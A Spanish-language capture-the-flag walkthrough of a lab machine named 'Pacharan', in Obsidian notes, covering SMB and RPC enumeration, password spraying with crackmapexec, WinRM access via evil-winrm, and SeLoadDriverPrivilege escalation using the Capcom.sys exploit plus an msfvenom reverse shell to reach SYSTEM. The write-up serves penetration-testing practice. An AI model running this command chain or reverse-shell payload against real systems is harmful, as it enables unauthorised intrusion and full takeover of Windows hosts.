@@ -1,0 +1,123 @@
+sudo arp-scan --interface=eth1 --localnet
+
+192.168.1.148
+
+nmap: 
+![[the hackers labs/avanzado/pacharan/test1.png]]
+
+--------
+
+En el escaneo nos dio muchos puertos pero nos dio: "smb2-time:" 
+podemos empezar a lanzar por SMB. 
+lanzamos:
+
+     smbmap -H 192.168.1.148 -u invitado
+
+
+![[the hackers labs/avanzado/pacharan/test2.png]]
+
+y nos importa los dos que dicen READ ONLY y volvemos a lanzar un smbmap pero utilizando los IPC:
+
+     smbclient -U invitado //192.168.1.148/NETLOGON2
+
+nos da un txt con: Pericodelospalotes6969
+
+![[the hackers labs/avanzado/pacharan/test3.png]]
+
+ahora tenemos un usuario y una posible contraseña, lanzamos:
+
+     smbmap -H 192.168.1.148 -u orujo -p Pericodelospalotes6969
+
+
+
+![[the hackers labs/avanzado/pacharan/test4.png]]
+
+ahora nos dio un "ah.txt" lo pasamos a nuestro terminal 
+
+![[the hackers labs/avanzado/pacharan/test5.png]]
+
+ahora vamos a enumerar los usuarios con "rpcclient" con el de Orujo
+
+     rpcclient -U 'Orujo' 192.168.1.148 
+
+![[the hackers labs/avanzado/pacharan/test6.png]]
+
+ahora todos esos nombres los vamos a meter a un txt. 
+
+>Administrador
+Invitado
+krbtgt
+DefaultAccount
+Orujo
+Ginebra
+Whisky
+Hendrick
+Chivas Regal
+Whisky2
+JB
+Chivas
+beefeater
+CarlosV
+RedLabel
+Gordons
+
+lanzamos: 
+
+     crackmapexec smb 192.168.1.148 -u user.txt -p ah.txt
+
+![[the hackers labs/avanzado/pacharan/test7.png]]
+
+obtenemos: PACHARAN.THL\Whisky:MamasoyStream2er@ 
+
+ahora que tenemos la contraseña podemos usar "rpcclient" otra vez pero con la contraseña que encontramos. 
+
+     rpcclient -U "Whisky%MamasoyStream2er@" 192.168.1.148 -c 'enumprinters'
+
+nos da: 
+
+![[the hackers labs/avanzado/pacharan/test8.png]]
+
+donde marque puede que sea una contraseña. 
+
+lanzamos: 
+
+     crackmapexec winrm 192.168.1.148 -u user.txt -p TurkisArrusPuchuchuSiu1
+
+![[the hackers labs/avanzado/pacharan/test9.png]]
+
+obtenemos: [+] PACHARAN.THL\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)
+
+**"Pwn3d!" se usa cuando un sistema, servidor o cuenta ha sido comprometido exitosamente. Ejemplo: si un atacante logra acceso root a un sistema, puede decir "Pwn3d!" para indicar que ha tomado el control total.**
+
+lanzamos:
+
+    evil-winrm -i 192.168.1.148 -u 'Chivas regal' -p TurkisArrusPuchuchuSiu1
+
+y obtenemos 
+
+![[the hackers labs/avanzado/pacharan/test10.png]]
+
+ahora vamos a escalar privilegios, vamos a crear una carpeta con los exploit que necesitaremos para escalar y aquí hay una explicación sobre la escalada: https://www.tarlogic.com/es/blog/explotacion-seloaddriverprivilege/
+
+nos vamos a la carpeta raíz y creamos un /tmp y dentro empezamos a cargar los exploit.
+https://github.com/JoshMorrison99/SeLoadDriverPrivilege
+
+     upload LoadDriver.exe
+
+     upload Capcom.sys
+
+     upload ExploitCapcom.exe 
+
+pasamos esos exploit a la maquina victima, y nos creamos una reverse shell 
+
+     msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o rev.exe
+
+ahora pasamos la rev.exe a la maquina victima, colocamos el terminal nuestro en escucha y ejecutamos el exploit junto a la reverse shell.
+
+     .\ExploitCapcom.exe C:\tmp\rev.exe
+
+
+![[the hackers labs/avanzado/pacharan/test11.png]]
+
+como vemos da: nt authority\system
+que es el nivel mas alto de privilegios del sistema. 
